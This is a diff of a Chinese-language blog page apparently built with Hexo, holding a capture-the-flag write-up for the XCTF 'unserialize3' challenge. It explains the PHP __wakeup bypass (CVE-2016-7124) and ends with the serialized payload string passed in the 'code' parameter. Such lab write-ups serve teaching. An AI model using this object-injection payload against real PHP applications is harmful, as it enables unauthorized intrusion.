@@ -67,7 +67,7 @@
     
 
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 <body>
     
 <nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
@@ -147,32 +147,32 @@
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
         <html><head></head><body><p>XCTF  unserialize3</p>
-<a id="more"></a>
+<span id="more"></span>
 
-<p><strong>&#x539F;&#x7406;</strong></p>
+<p><strong>原理</strong></p>
 <ul>
-<li>   PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF1A;&#x6267;&#x884C;unserialize()&#x65F6;&#xFF0C;&#x5148;&#x4F1A;&#x8C03;&#x7528;__wakeup()&#x3002;</li>
-<li>   &#x5F53;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x5C5E;&#x6027;&#x503C;&#x4E2A;&#x6570;&#x5927;&#x4E8E;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F02;&#x5E38;&#xFF0C;&#x4ECE;&#x800C;&#x8DF3;&#x8FC7;__wakeup()&#x3002;</li>
+<li>   PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。</li>
+<li>   当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。</li>
 </ul>
-<p><strong>&#x76EE;&#x7684;</strong></p>
-<p>&#x7ED5;&#x8FC7;&#x5E38;&#x89C1;&#x7684;&#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x673A;&#x5236;</p>
-<p><strong>&#x6B65;&#x9AA4;</strong></p>
-<p>&#x6253;&#x5F00;&#x9776;&#x673A;</p>
-<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">&apos;111&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">		<span class="hljs-keyword">exit</span>(<span class="hljs-string">&apos;bad requests&apos;</span>);</span><br><span class="line">	}</span><br><span class="line">?code=</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>目的</strong></p>
+<p>绕过常见的函数过滤机制</p>
+<p><strong>步骤</strong></p>
+<p>打开靶机</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">		<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);</span><br><span class="line">	}</span><br><span class="line">?code=</span><br></pre></td></tr></tbody></table></figure>
 
-<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x9898;&#x76EE;&#x4FE1;&#x606F;&#x662F;&#x4E00;&#x4E2A;xctf&#x7C7B;&#xFF0C;&#x5305;&#x542B;&#x4E00;&#x4E2A;public&#x53D8;&#x91CF;flag&#x548C;php&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;__wakeup()&#x3002;&#x5C06;&#x9700;&#x8981;&#x4F20;&#x9012;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x8D4B;&#x503C;&#x7ED9;code&#x8FDB;&#x884C;&#x4F20;&#x9012;&#x3002;</p>
-<p>&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x662F;&#x5F97;&#x5230;flag&#xFF0C;&#x800C;__wakeup()&#x65B9;&#x6CD5;&#x4F1A;&#x5728;unserialize()&#x6267;&#x884C;&#x524D;&#x8C03;&#x7528;&#xFF0C;</p>
-<p>__wabkeup()&#x65B9;&#x6CD5;&#x4F1A;&#x6267;&#x884C;exit()&#x51FD;&#x6570;&#xFF0C;&#x6545;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0D;&#x53EF;&#x8FDB;&#x884C;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x8BE5;&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;</p>
-<p>&#x5177;&#x4F53;&#x7EC6;&#x8282;&#xFF1A;<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a></p>
-<p>&#x6B63;&#x5E38;&#x5E8F;&#x5217;&#x5316;</p>
-<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">&apos;111&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">		<span class="hljs-keyword">exit</span>(<span class="hljs-string">&apos;bad requests&apos;</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">$test = <span class="hljs-keyword">new</span> xctf;</span><br><span class="line">$data = serialize($test);</span><br><span class="line"><span class="hljs-keyword">echo</span> $data;</span><br></pre></td></tr></tbody></table></figure>
+<p>可以看到题目信息是一个xctf类，包含一个public变量flag和php的魔术方法__wakeup()。将需要传递的序列化字符串赋值给code进行传递。</p>
+<p>我们的目标是得到flag，而__wakeup()方法会在unserialize()执行前调用，</p>
+<p>__wabkeup()方法会执行exit()函数，故反序列化不可进行，那我们该如何绕过呢？</p>
+<p>具体细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a></p>
+<p>正常序列化</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">		<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf;</span><br><span class="line"><span class="hljs-variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;</span><br></pre></td></tr></tbody></table></figure>
 
-<p>&#x540E;&#x7684;&#x7ED3;&#x679C;&#x662F;</p>
-<p>&#x200B;    &#x6570;&#x636E;&#x7C7B;&#x578B;:&#x5C5E;&#x6027;&#x540D;&#x957F;&#x5EA6;:&#x201D;&#x5C5E;&#x6027;&#x540D;&#x201D;:&#x5C5E;&#x6027;&#x4E2A;&#x6570;;&#x6570;&#x636E;&#x7C7B;&#x578B;:&#x5C5E;&#x6027;&#x503C;&#x957F;&#x5EA6;:&#x201D;&#x5C5E;&#x6027;&#x503C;&#x201D;</p>
-<p>&#x200B;    O:4:&#x201D;xctf&#x201D;:1:{s:4:&#x201D;flag&#x201D;;s:3:&#x201D;111&#x201D;;}</p>
-<p>&#x5982;&#x679C;&#x76F4;&#x63A5;&#x4F20;&#x9012;&#x7ED9;code&#x5C31;&#x4F1A;&#x6267;&#x884C;exit()&#x51FD;&#x6570;&#x3002;</p>
-<p>&#x6545;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ED5;&#x8FC7;__wakeup()&#xFF0C;&#x5C06;&#x5C5E;&#x6027;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;&#x5927;&#x4E8E;1&#x7684;&#x6574;&#x578B;&#x503C;&#x5373;&#x53EF;&#x5BFC;&#x81F4;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F02;&#x5E38;&#x3002;</p>
-<p>&#x4F20;&#x9012;?code=O:4:&#x201D;xctf&#x201D;:2:{s:4:&#x201D;flag&#x201D;;s:3:&#x201D;111&#x201D;;}&#x53C2;&#x6570;&#x5373;&#x53EF;getflag&#x3002;</p>
+<p>后的结果是</p>
+<p>​    数据类型:属性名长度:”属性名”:属性个数;数据类型:属性值长度:”属性值”</p>
+<p>​    O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>如果直接传递给code就会执行exit()函数。</p>
+<p>故我们需要绕过__wakeup()，将属性值设置为大于1的整型值即可导致反序列化异常。</p>
+<p>传递?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}参数即可getflag。</p>
 </body></html>
     
     </div>
